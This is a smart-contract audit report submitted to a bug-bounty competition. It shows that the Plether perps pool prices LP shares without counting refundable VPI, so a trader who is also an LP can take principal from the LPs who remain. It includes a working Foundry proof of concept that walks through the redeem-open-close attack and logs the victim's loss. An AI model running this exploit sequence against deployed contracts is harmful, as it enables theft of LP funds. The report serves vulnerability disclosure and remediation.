# \#100099 [SC-Critical] `buildReconcileSnapshot` excludes refundable VPI from LP NAV, enabling value extraction

**Submitted on Nov 16th 2026 at 08:19:01 UTC by @krikolkk for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100099
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

# Brief/Intro

LP deposits and redemptions are priced from pool NAV, and opening a position books its VPI charge as pool revenue. However, NAV omits the same positionâ€™s refundable VPI, so a trader-LP can time an epoch redemption or deposit to transfer principal from LPs who remain.

## Vulnerability Details

When a position opens, its VPI charge is booked as pool revenue and increases the assets used to price LP shares. On a later skew-reducing close, the position can reclaim its lifetime positive accrual; the clamp allows the refund to reach the full charge:

```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

`HousePoolAccountingLib.buildReconcileSnapshot` prices shares without marking that refundable accrual as a liability. It also omits the reserve-backed negative VPI that can be returned to the pool, making NAV too low while that reserve is outstanding. LPs therefore enter or exit at a price that does not reflect these outstanding VPI amounts.

A trader-LP queues a redemption, opens a skew-creating position before the next epoch, and settles the redemption while the VPI charge is counted in NAV. For example, with $10 million depth, `vpiFactor = 0.01`, and $3.9 million skew, the charge is about $7,603. The trader then closes the position, reduces skew, and receives the refundable charge from pool cash after the redemption has settled.

The reverse timing lets a trader-LP enter: a skew-reducing open creates a rebate held as a non-withdrawable reserve and depresses NAV; the traderâ€™s deposit activates at that price, then the close returns the reserve to the pool. The entry path requires existing skew. In either path, the resulting value transfer is final once the deposit or redemption settles. Consider marking refundable VPI as a liability and recoverable reserves as receivables in share pricing, excluding receivables from immediately withdrawable assets, and enforcing the skew limit against post-redemption depth before funding an LP exit.

## Impact Details

A trader-LP can take principal from LPs who remain through deposits or redemptions priced while VPI is unmarked. Each transfer is limited to the attackerâ€™s pro-rata share of the outstanding VPI charge or reserve, but can recur across epochs and is permanent after settlement. In the PoC, the attacker gains $1,281.20 after fees and the staying LP loses $2,840.76. At default `vpiFactor = 0.01` and maximum skew, one VPI amount is at most 0.08% of pool depth; governance validation places no upper bound on `vpiFactor`.

A temporary junior deposit followed by an exit can also leave incumbent LPs backing a position above the configured skew limit, sharply restricting withdrawals until it closes. In the measured example, skew reaches 9,876 bps of net depth against a 4,000 bps limit, reducing junior and senior withdrawal capacity to about 9,862 `USDG`; remaining LPs lose 1,211.01 `USDG` while the attacker gains 815.01 `USDG` at unchanged price.

## References

1. [`OpenAccountingLib.sol`, VPI charged on open](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/OpenAccountingLib.sol#L127-L135)
2. [`CloseAccountingLib.sol`, lifetime VPI refund clamp](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118)
3. [`HousePoolAccountingLib.sol`, LP NAV reconciliation](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L77)

## Proof of Concept

## Proof of Concept

Save the following as `test/poc/PoC/PoC.t.sol` and run it from the repository root (`packages/perps`) with `FOUNDRY_TEST=test/poc/PoC FOUNDRY_DISABLE_NIGHTLY_WARNING=1 forge test --match-path "test/poc/PoC/*.t.sol" -vvvv`. It relies only on the repository's existing `test/perps/BasePerpTest.sol` fixture:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

/// Refundable lifetime VPI is booked as LP revenue the moment it is paid, but LP NAV never marks the refund the same
/// position can claim when it closes. A trader who is also an LP queues a redemption, opens a skew-creating position
/// (pays VPI C), is redeemed at a NAV inflated by C, then closes and is refunded C from pool cash.
/// The LP who stays pays for it.
contract PLTH178PoC is BasePerpTest {

    address internal victim = address(0xA11CE);
    address internal attacker = address(0xBAD);

    uint256 internal constant ATTACKER_LP = 5_800_000e6; // attacker holds ~58% of junior NAV
    uint256 internal constant VICTIM_LP = 4_200_000e6; // incumbent LP holds ~42%
    uint256 internal constant SIZE = 3_900_000e18; // $3.9M LONG at $1 on an empty book => skew S ~ 0.39 D
    uint256 internal constant TRADER_MARGIN = 150_000e6;

    // Deployment params: vpiFactor k = 0.01, maxSkewRatio 40%, engine default execution fee (4 bps).
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 100,
            initMarginBps: 150,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _settleEpochAndClaim(
        address lp,
        uint256 requestId
    ) internal returns (uint256 proceeds) {
        vm.warp(pool.lpEpochStart(requestId));
        bytes[] memory data = _mockPythUpdateData();
        router.settleLpEpoch(data);
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, lp);
        vm.prank(lp);
        proceeds = juniorVault.claimRedeem(requestId, claimable, lp, lp);
    }

    function test_PoC_TraderLpRecoversOwnVpiFromStayingLps() public {
        // ---------- Arrange ----------
        _fundJunior(victim, VICTIM_LP);
        _fundJunior(attacker, ATTACKER_LP);
        _fundTrader(attacker, TRADER_MARGIN);
        vm.warp(block.timestamp + 1 hours);

        uint256 attackerShares = juniorVault.balanceOf(attacker);
        uint256 victimShares = juniorVault.balanceOf(victim);
        uint256 depth = pool.totalAssets(); // D: pool depth the engine prices VPI against
        uint256 attackerFairLpValue = juniorVault.estimateRedeemAssets(attackerShares); // NAV before any trading
        uint256 alphaWad = (attackerShares * 1e18) / juniorVault.totalSupply(); // attacker's share of LP NAV

        // Independent reference from the VPI spec C = k * S^2 / (2 D) (k = 0.01, S = $3.9M notional), not engine output.
        uint256 skewAssets = SIZE / 1e12; // $3.9M in 6-decimal settlement units
        uint256 cRef = (0.01e18 * skewAssets * skewAssets) / (2 * depth) / 1e18;
        uint256 feeRef = (skewAssets * engine.executionFeeBps()) / 10_000; // one execution fee on the notional

        // ---------- Act ----------
        // 1. Attacker queues a full LP redemption for the next hourly epoch.
        vm.prank(attacker);
        uint256 redeemId = juniorVault.requestRedeem(attackerShares, attacker, attacker);

        // 2. Attacker opens a skew-creating LONG. VPI charge C is booked as pool revenue and lifts LP NAV.
        vm.prank(attacker);
        router.commitOrder(CfdTypes.Side.LONG, SIZE, TRADER_MARGIN - 20_000e6, 1e8, false);
        bytes[] memory data = _mockPythUpdateData();
        router.executeOrder(router.nextExecuteId(), data);
        (uint256 posSize,,,,,, int256 vpiAccrued) = engine.positions(attacker);
        assertEq(posSize, SIZE, "position opened");
        assertApproxEqAbs(uint256(vpiAccrued), cRef, 2, "paid VPI equals k*S^2/(2D)");

        // 3. The LP epoch settles: the attacker is redeemed at a NAV that already contains C but no refund liability.
        uint256 lpProceeds = _settleEpochAndClaim(attacker, redeemId);
        uint256 overpayment = lpProceeds - attackerFairLpValue;

        // 4. Attacker closes the position (skew S -> 0) and is refunded C from pool cash.
        vm.prank(attacker);
        router.commitOrder(CfdTypes.Side.LONG, SIZE, 0, 0, true);
        data = _mockPythUpdateData();
        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);
        router.executeOrder(router.nextExecuteId(), data);
        (posSize,,,,,,) = engine.positions(attacker);
        assertEq(posSize, 0, "position closed");

        // 5. The incumbent LP now exits at the post-cycle NAV.
        vm.prank(victim);
        uint256 victimRedeemId = juniorVault.requestRedeem(victimShares, victim, victim);
        uint256 victimProceeds = _settleEpochAndClaim(victim, victimRedeemId);

        // ---------- Assert ----------
        // Attacker wealth: everything it put in (LP + trading margin) vs everything it got out (LP proceeds + account).
        uint256 attackerIn = ATTACKER_LP + TRADER_MARGIN;
        uint256 attackerOut = lpProceeds + clearinghouse.balanceAssets(attacker);
        uint256 victimLoss = VICTIM_LP - victimProceeds;

        emit log_named_uint("C = k*S^2/(2D) (reference)            ", cRef);
        emit log_named_uint("alpha (WAD)                          ", alphaWad);
        emit log_named_uint("attacker redemption proceeds         ", lpProceeds);
        emit log_named_uint("fair redemption value (pre-trade NAV)", attackerFairLpValue);
        emit log_named_uint("overpayment at redemption            ", overpayment);
        emit log_named_uint("attacker total in  (LP + margin)     ", attackerIn);
        emit log_named_uint("attacker total out (LP + account)    ", attackerOut);
        emit log_named_uint("victim LP deposit                    ", VICTIM_LP);
        emit log_named_uint("victim LP exit proceeds              ", victimProceeds);
        emit log_named_uint("VICTIM NET LOSS                      ", victimLoss);

        // The exiting LP is overpaid by exactly its share of C, which the same position then claws back as a refund.
        assertApproxEqAbs(overpayment, (alphaWad * cRef) / 1e18, 1e6, "redemption overpaid by alpha*C");
        // Net of both execution fees, carry and keeper bounties, the trader-LP still profits: alpha*C - 2*fee.
        assertGt(attackerOut, attackerIn, "trader-LP profits");
        uint256 attackerGain = attackerOut - attackerIn;
        emit log_named_uint("ATTACKER NET GAIN                    ", attackerGain);
        assertApproxEqAbs(attackerGain, (alphaWad * cRef) / 1e18 - 2 * feeRef, 30e6, "gain ~ alpha*C - 2 fees");
        // The staying LP receives less than it deposited (one fee flows back to the pool, the other to the treasury).
        assertGt(victimLoss, 0, "incumbent LP loses principal");
        assertApproxEqAbs(victimLoss, (alphaWad * cRef) / 1e18 - feeRef, 100e6, "loss ~ alpha*C - retained fee");
    }

}
```

```console
[PASS] test_PoC_TraderLpRecoversOwnVpiFromStayingLps() (gas: 7217768)
Logs:
C = k*S^2/(2D) (reference)            : 7603479304
alpha (WAD)                          : 579942006858520209
attacker redemption proceeds         : 5804409566452
fair redemption value (pre-trade NAV): 5799999994703
overpayment at redemption            : 4409571749
attacker total in  (LP + margin)     : 5950000000000
attacker total out (LP + account)    : 5951281195732
victim LP deposit                    : 4200000000000
victim LP exit proceeds              : 4197159244101
VICTIM NET LOSS                      : 2840755899
ATTACKER NET GAIN                    : 1281195732

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.23ms (4.80ms CPU time)
```
